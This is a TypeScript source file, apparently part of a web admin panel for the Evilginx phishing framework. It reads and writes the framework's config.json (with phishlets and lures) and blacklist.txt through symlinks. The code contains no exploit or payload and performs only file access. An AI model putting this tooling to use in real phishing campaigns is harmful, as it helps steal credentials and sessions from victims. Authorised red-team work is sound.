import fs from "fs";
import path from "path";

// Configuration file paths
const configPath = path.join(process.cwd(), "data", "config.json");
const blacklistPath = path.join(process.cwd(), "data", "blacklist.txt");

// Config interface definitions
interface ConfigFile {
  general?: Record<string, unknown>;
  blacklist?: Record<string, unknown>;
  phishlets?: Record<string, unknown>;
  lures?: Array<unknown>;
  [key: string]: unknown;
}

// Utility function to check if symlinks are properly set up
function checkSymlinks(): boolean {
  const filesToCheck = [configPath, blacklistPath];
  const missingFiles: string[] = [];

  for (const filePath of filesToCheck) {
    if (!fs.existsSync(filePath)) {
      missingFiles.push(filePath);
      continue;
    }

    try {
      // Check if it's a symlink
      const stats = fs.lstatSync(filePath);
      if (!stats.isSymbolicLink()) {
        console.error(`ERROR: ${filePath} exists but is not a symlink.`);
        console.error(
          `The panel expects this to be a symlink to a file in the .evilginx directory.`
        );
        console.error(
          `Run the init_sync_watch.sh or create_symlinks_only.sh script to set up proper symlinks.`
        );
        throw new Error(`File ${path.basename(filePath)} is not a symlink`);
      }

      // Verify the symlink can be read
      try {
        fs.readFileSync(filePath, "utf8");
      } catch (readError) {
        console.error(`ERROR: Cannot read symlink ${filePath}.`);
        console.error(
          `This likely means the target file in .evilginx directory doesn't exist.`
        );
        console.error(
          `NOTE: The panel will NOT create this file for you. You must create it manually.`
        );
        throw new Error(
          `Cannot read symlink ${path.basename(filePath)}: ${
            (readError as Error).message
          }`
        );
      }
    } catch (error) {
      console.error(`Symlink verification error:`, error);
      throw error;
    }
  }

  if (missingFiles.length > 0) {
    console.error(`ERROR: The following required files are missing:`);
    missingFiles.forEach((file) => console.error(`- ${file}`));
    console.error(
      `Please ensure the .evilginx directory contains all required files.`
    );
    console.error(`The panel will NOT create these files for you.`);
    console.error(
      `Run the init_sync_watch.sh or create_symlinks_only.sh script after creating these files.`
    );
    throw new Error(
      `Missing required files: ${missingFiles
        .map((f) => path.basename(f))
        .join(", ")}`
    );
  }

  return true;
}

class ConfigService {
  /**
   * Get the full configuration
   */
  static async getFullConfig(): Promise<ConfigFile> {
    try {
      // Verify symlinks before proceeding
      checkSymlinks();

      const configData = await fs.promises.readFile(configPath, "utf8");
      return JSON.parse(configData) as ConfigFile;
    } catch (error) {
      console.error("Error reading config file:", error);
      console.error(
        "IMPORTANT: The panel will NOT create default configuration files."
      );
      console.error(
        "Please ensure the .evilginx directory contains a valid config.json file."
      );
      throw new Error(`Failed to read config: ${(error as Error).message}`);
    }
  }

  /**
   * Update the configuration file
   */
  static async updateConfig(config: ConfigFile): Promise<{ success: boolean }> {
    try {
      // Verify symlinks before proceeding
      checkSymlinks();

      await fs.promises.writeFile(configPath, JSON.stringify(config, null, 2));
      return { success: true };
    } catch (error) {
      console.error("Error writing config file:", error);
      console.error(
        "IMPORTANT: Make sure the .evilginx directory and config.json exist and are writable."
      );
      throw new Error(`Failed to write config: ${(error as Error).message}`);
    }
  }

  /**
   * Get the blacklist configuration
   */
  static async getBlacklist(): Promise<string> {
    try {
      // Verify symlinks before proceeding
      checkSymlinks();

      const blacklistData = await fs.promises.readFile(blacklistPath, "utf8");
      return blacklistData;
    } catch (error) {
      console.error("Error reading blacklist file:", error);
      console.error(
        "IMPORTANT: The panel will NOT create default blacklist files."
      );
      console.error(
        "Please ensure the .evilginx directory contains a valid blacklist.txt file."
      );
      throw new Error(`Failed to read blacklist: ${(error as Error).message}`);
    }
  }

  /**
   * Update the blacklist file
   */
  static async updateBlacklist(content: string): Promise<{ success: boolean }> {
    try {
      // Verify symlinks before proceeding
      checkSymlinks();

      await fs.promises.writeFile(blacklistPath, content);
      return { success: true };
    } catch (error) {
      console.error("Error writing blacklist file:", error);
      console.error(
        "IMPORTANT: Make sure the .evilginx directory and blacklist.txt exist and are writable."
      );
      throw new Error(`Failed to write blacklist: ${(error as Error).message}`);
    }
  }
}

export default ConfigService;
